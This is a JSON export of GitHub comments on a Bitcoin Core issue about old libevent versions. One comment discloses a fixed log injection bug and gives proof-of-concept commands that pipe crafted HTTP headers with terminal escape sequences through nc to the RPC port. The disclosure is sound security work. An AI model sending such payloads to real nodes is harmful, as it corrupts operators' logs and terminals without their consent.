[
   {
      "author_association" : "MEMBER",
      "body" : "see also #8639 by @fanquake ",
      "created_at" : "2019-12-03T01:28:42Z",
      "html_url" : "https://github.com/bitcoin/bitcoin/issues/17652#issuecomment-560956319",
      "id" : 560956319,
      "issue_url" : "https://api.github.com/repos/bitcoin/bitcoin/issues/17652",
      "node_id" : "MDEyOklzc3VlQ29tbWVudDU2MDk1NjMxOQ==",
      "updated_at" : "2019-12-03T01:28:42Z",
      "url" : "https://api.github.com/repos/bitcoin/bitcoin/issues/comments/560956319",
      "user" : {
         "avatar_url" : "https://avatars0.githubusercontent.com/u/6399679?v=4",
         "events_url" : "https://api.github.com/users/MarcoFalke/events{/privacy}",
         "followers_url" : "https://api.github.com/users/MarcoFalke/followers",
         "following_url" : "https://api.github.com/users/MarcoFalke/following{/other_user}",
         "gists_url" : "https://api.github.com/users/MarcoFalke/gists{/gist_id}",
         "gravatar_id" : "",
         "html_url" : "https://github.com/MarcoFalke",
         "id" : 6399679,
         "login" : "MarcoFalke",
         "node_id" : "MDQ6VXNlcjYzOTk2Nzk=",
         "organizations_url" : "https://api.github.com/users/MarcoFalke/orgs",
         "received_events_url" : "https://api.github.com/users/MarcoFalke/received_events",
         "repos_url" : "https://api.github.com/users/MarcoFalke/repos",
         "site_admin" : false,
         "starred_url" : "https://api.github.com/users/MarcoFalke/starred{/owner}{/repo}",
         "subscriptions_url" : "https://api.github.com/users/MarcoFalke/subscriptions",
         "type" : "User",
         "url" : "https://api.github.com/users/MarcoFalke"
      }
   },
   {
      "author_association" : "MEMBER",
      "body" : "The minimum version is not always determined by what works, but by what is still reasonably testable against.\r\n\r\nDon't ask for any guarantees if is \"safe\" (under the usual considerations it could be: we don't use libevent in the P2P code, the RPC port is for trusted use only), and there have been bugs that have been fixed since (such as file descriptor leaks), but if it works, it works.\r\n\r\n",
      "created_at" : "2019-12-03T08:45:22Z",
      "html_url" : "https://github.com/bitcoin/bitcoin/issues/17652#issuecomment-561061556",
      "id" : 561061556,
      "issue_url" : "https://api.github.com/repos/bitcoin/bitcoin/issues/17652",
      "node_id" : "MDEyOklzc3VlQ29tbWVudDU2MTA2MTU1Ng==",
      "updated_at" : "2019-12-03T08:45:22Z",
      "url" : "https://api.github.com/repos/bitcoin/bitcoin/issues/comments/561061556",
      "user" : {
         "avatar_url" : "https://avatars0.githubusercontent.com/u/126646?v=4",
         "events_url" : "https://api.github.com/users/laanwj/events{/privacy}",
         "followers_url" : "https://api.github.com/users/laanwj/followers",
         "following_url" : "https://api.github.com/users/laanwj/following{/other_user}",
         "gists_url" : "https://api.github.com/users/laanwj/gists{/gist_id}",
         "gravatar_id" : "",
         "html_url" : "https://github.com/laanwj",
         "id" : 126646,
         "login" : "laanwj",
         "node_id" : "MDQ6VXNlcjEyNjY0Ng==",
         "organizations_url" : "https://api.github.com/users/laanwj/orgs",
         "received_events_url" : "https://api.github.com/users/laanwj/received_events",
         "repos_url" : "https://api.github.com/users/laanwj/repos",
         "site_admin" : false,
         "starred_url" : "https://api.github.com/users/laanwj/starred{/owner}{/repo}",
         "subscriptions_url" : "https://api.github.com/users/laanwj/subscriptions",
         "type" : "User",
         "url" : "https://api.github.com/users/laanwj"
      }
   },
   {
      "author_association" : "MEMBER",
      "body" : "I looked back in git history and the first libevent that was ever used (in depends) was 2.0.22. I suppose it was the latest stable (2.0 branch) at the time boost::asio was replaced with libevent.\r\n\r\nMind that you're talking about 7 year old software (2.0.11 was released 2012-11-18) which covers a large part of the project's recorded history.\r\n\r\nI'd strongly recommend building using depends to have a newer version.",
      "created_at" : "2019-12-03T08:57:41Z",
      "html_url" : "https://github.com/bitcoin/bitcoin/issues/17652#issuecomment-561066033",
      "id" : 561066033,
      "issue_url" : "https://api.github.com/repos/bitcoin/bitcoin/issues/17652",
      "node_id" : "MDEyOklzc3VlQ29tbWVudDU2MTA2NjAzMw==",
      "updated_at" : "2019-12-03T08:58:15Z",
      "url" : "https://api.github.com/repos/bitcoin/bitcoin/issues/comments/561066033",
      "user" : {
         "avatar_url" : "https://avatars0.githubusercontent.com/u/126646?v=4",
         "events_url" : "https://api.github.com/users/laanwj/events{/privacy}",
         "followers_url" : "https://api.github.com/users/laanwj/followers",
         "following_url" : "https://api.github.com/users/laanwj/following{/other_user}",
         "gists_url" : "https://api.github.com/users/laanwj/gists{/gist_id}",
         "gravatar_id" : "",
         "html_url" : "https://github.com/laanwj",
         "id" : 126646,
         "login" : "laanwj",
         "node_id" : "MDQ6VXNlcjEyNjY0Ng==",
         "organizations_url" : "https://api.github.com/users/laanwj/orgs",
         "received_events_url" : "https://api.github.com/users/laanwj/received_events",
         "repos_url" : "https://api.github.com/users/laanwj/repos",
         "site_admin" : false,
         "starred_url" : "https://api.github.com/users/laanwj/starred{/owner}{/repo}",
         "subscriptions_url" : "https://api.github.com/users/laanwj/subscriptions",
         "type" : "User",
         "url" : "https://api.github.com/users/laanwj"
      }
   },
   {
      "author_association" : "MEMBER",
      "body" : "I wouldn't recommend using old versions of `libevent`.\r\n\r\nPlease see the following `libevent` related log injection bug I reported to `security@bitcoincore.org` back in October. It was not considered a vulnerability and I was given an explicit sign-off for posting it publicly (\"IMO, we could just as well be discussing this on github\") so here it goes :)\r\n\r\n```\r\nAnyways here is the problem:\r\n\r\nhttps://github.com/bitcoin/bitcoin/blame/8ab4f282c06d67074b872dbda0be37636fdd5186/src/httpserver.cpp#L345-L356\r\n\r\nAny high severity libevent error message is printed unfiltered to the Bitcoin Core logs\r\nand console.\r\n\r\nAn example:\r\n\r\n$ printf \"POST / HTTP/1.0\\r\\nConnection: you-have-been-log-injected\\r\\n\\r\\n\" | nc ip 8332\r\n\r\nIn log and console:\r\n\r\n2019-10-15T10:08:43Z libevent: evhttp_get_body_length: we got no content length, but the\r\nserver wants to keep the connection open: you-have-been-log-injected.\r\n\r\nA slightly more creative example which a.) changes the tmux title to\r\n\"tmux-title-injection-${RANDOM}\" and b.) prints some fancy red text :)\r\n\r\nCLEAR=$(xxd -p -r <<< \"1b5b481b5b4a\")\r\nTMUX_TITLE_PRE=$(xxd -p -r <<< \"1b6b\")\r\nTMUX_TITLE_POST=$(xxd -p -r <<< \"1b5c\")\r\nCOLOR_PRE=$(xxd -p -r <<< \"1b5b33313b313b346d0a\")\r\nCOLOR_POST=$(xxd -p -r <<< \"1b5b306d0a\")\r\nINJECT_STRING=\"${TMUX_TITLE_PRE}tmux-title-injection-${RANDOM}${TMUX_TITLE_POST}${CLEAR}${COLOR_PRE}log-injection-${RANDOM}${COLOR_POST}\"\r\nprintf \"POST / HTTP/1.0\\r\\nConnection: %s\\r\\n\\r\\n\" \"${INJECT_STRING}\" | nc ip 8332\r\n```\r\n\r\nThat bug report lead to the PR https://github.com/bitcoin/bitcoin/pull/17095 which largely kills the log injection bug class which is nice. Fixing bugs is cool -- fixing entire bug classes is very cool :)\r\n\r\nNote also that the bug could have been prevented by using a post-February 2018 version of `libevent` thanks to the upstream change  https://github.com/azat/libevent/commit/cd57e38c3f77d0f6a718d9c1f2e3ead78a98bd06.\r\n\r\ntl;dr -- running old `libevent` no good: at least not pre-PR-#17095 :)",
      "created_at" : "2019-12-03T09:25:34Z",
      "html_url" : "https://github.com/bitcoin/bitcoin/issues/17652#issuecomment-561076723",
      "id" : 561076723,
      "issue_url" : "https://api.github.com/repos/bitcoin/bitcoin/issues/17652",
      "node_id" : "MDEyOklzc3VlQ29tbWVudDU2MTA3NjcyMw==",
      "updated_at" : "2019-12-03T09:25:48Z",
      "url" : "https://api.github.com/repos/bitcoin/bitcoin/issues/comments/561076723",
      "user" : {
         "avatar_url" : "https://avatars3.githubusercontent.com/u/7826565?v=4",
         "events_url" : "https://api.github.com/users/practicalswift/events{/privacy}",
         "followers_url" : "https://api.github.com/users/practicalswift/followers",
         "following_url" : "https://api.github.com/users/practicalswift/following{/other_user}",
         "gists_url" : "https://api.github.com/users/practicalswift/gists{/gist_id}",
         "gravatar_id" : "",
         "html_url" : "https://github.com/practicalswift",
         "id" : 7826565,
         "login" : "practicalswift",
         "node_id" : "MDQ6VXNlcjc4MjY1NjU=",
         "organizations_url" : "https://api.github.com/users/practicalswift/orgs",
         "received_events_url" : "https://api.github.com/users/practicalswift/received_events",
         "repos_url" : "https://api.github.com/users/practicalswift/repos",
         "site_admin" : false,
         "starred_url" : "https://api.github.com/users/practicalswift/starred{/owner}{/repo}",
         "subscriptions_url" : "https://api.github.com/users/practicalswift/subscriptions",
         "type" : "User",
         "url" : "https://api.github.com/users/practicalswift"
      }
   }
]
